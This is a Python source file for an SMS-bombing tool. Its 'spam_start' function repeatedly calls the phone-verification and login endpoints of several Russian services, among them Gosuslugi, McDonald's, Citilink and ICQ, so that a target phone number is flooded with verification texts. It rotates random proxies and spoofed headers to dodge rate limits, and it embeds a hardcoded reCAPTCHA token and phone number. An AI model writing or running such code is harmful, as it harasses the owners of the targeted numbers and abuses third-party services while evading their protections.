from httpx import AsyncClient
from datetime import datetime,timedelta
from peewee import Model
from fake_headers import Headers

from loguru import logger
from assets.proxies.proxy import get_random_proxy

def format_phone(phone, phone_mask):
        phone_list = list(phone)
        for i in phone_list:
            phone_mask = phone_mask.replace("*", i, 1)
        return phone_mask


async def spam_start(phone,break_time,_id,current:datetime,SpamPhone:Model):
    def save_arg(_id):
        stop_num = SpamPhone.get_by_id(_id).stop_num
        SpamPhone.update(stop_num=stop_num+1).where(SpamPhone.id==_id).execute()
    

    def check(phone,break_time,_id,current:datetime,SpamPhone:Model):
        revision = SpamPhone.get_by_id(_id).stop
        print(_id,revision)
        if revision == True:
            save_arg(_id)
            
            return True
        if (current + timedelta(minutes=int(break_time))) < datetime.now():
            save_arg(_id)
            return True
    
    proxy = get_random_proxy()
    async with AsyncClient(headers=Headers().generate(),proxies=f'https://{proxy}',timeout=10) as client:
        while True:
            try:
                to_send =  await client.post('https://vapezone.pro/index.php?dispatch=csc_sms.check_cookies_for_dinner',timeout=10)
                await client.post(f'https://vapezone.pro/index.php?dispatch=csc_sms.generate_code&phone=%2B{phone}&secret_key={to_send}&prefix=&is_ajax=1',timeout=10)
                if check(phone,break_time,_id,current,SpamPhone):
                    return 
            except:
                pass
            try:
                await client.post('https://mobile.sravni.ru/v1/auth',json={'phone':phone},timeout=10)
                if check(phone,break_time,_id,current,SpamPhone):
                    return 
            except:
                pass

            try:
                await client.post('https://www.gosuslugi.ru/auth-provider/mobile/register',json={'instanceId':'123','firstName':'Иван','lastName':'Котов','contactType':'mobile','contactValue':format_phone('79165885068','+*(***)*******')},timeout=10)
                if check(phone,break_time,_id,current,SpamPhone):
                    return 
            except:
                pass
                
            try:
                await client.post("https://site-api.mcdonalds.ru/api/v1/user/login/phone",timeout=10,json={'number':f'+{phone}',"g-recaptcha-response":"03AGdBq24rQ30xdNbVMpoibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atTsBgy2p4N7MlR77lDY9HybTWn5U9V"})
                if check(phone,break_time,_id,current,SpamPhone):
                    return 
            except:
                pass

            try:
                await client.post("https://kokao.revoup.ru/v2/auth",json={'mobile_phone':phone},timeout=10)
                if check(phone,break_time,_id,current,SpamPhone):
                    return 
            except:
                pass

            try:
                await client.get("https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B" + phone,timeout=6)
                if check(phone,break_time,_id,current,SpamPhone):
                    return 
            except:
                pass

            try:
                await client.post('https://www.citilink.ru/registration/confirm/phone/'+f'+{phone}'+'/',timeout=6)
                if check(phone,break_time,_id,current,SpamPhone):
                    return 
            except:
                pass

            try:
                await client.post('https://u.icq.net/api/v70/rapi/auth/sendCode',json={"reqId":"16587-1644148274","params":{"phone":phone,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},timeout=10)
                if check(phone,break_time,_id,current,SpamPhone):
                    return 
            except:
                pass